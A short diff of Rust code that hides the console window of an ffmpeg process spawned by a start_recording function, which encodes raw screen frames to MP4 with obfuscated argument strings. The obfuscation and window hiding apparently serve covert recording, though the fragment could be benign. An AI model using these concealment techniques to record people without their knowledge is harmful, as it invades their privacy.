@@ -1,5 +1,6 @@
 use obfstr::obfstr;
 use base64::Engine;
+use crate::no_window;
 use std::io::Write;
 use std::process::{Command, Stdio};
 use std::sync::{Arc, Mutex};
@@ -89,7 +90,7 @@ pub async fn start_recording(
 
     std::thread::spawn(move || {
         // Spawn ffmpeg: read raw RGBA from stdin, encode to MP4
-        let mut ffmpeg = match Command::new(&ffmpeg_bin)
+        let mut ffmpeg = match no_window(Command::new(&ffmpeg_bin)
             .args([
                 obfstr!("-y"),
                 obfstr!("-f"), obfstr!("rawvideo"),
@@ -106,7 +107,7 @@ pub async fn start_recording(
             ])
             .stdin(Stdio::piped())
             .stdout(Stdio::null())
-            .stderr(Stdio::null())
+            .stderr(Stdio::null()))
             .spawn()
         {
             Ok(child) => child,
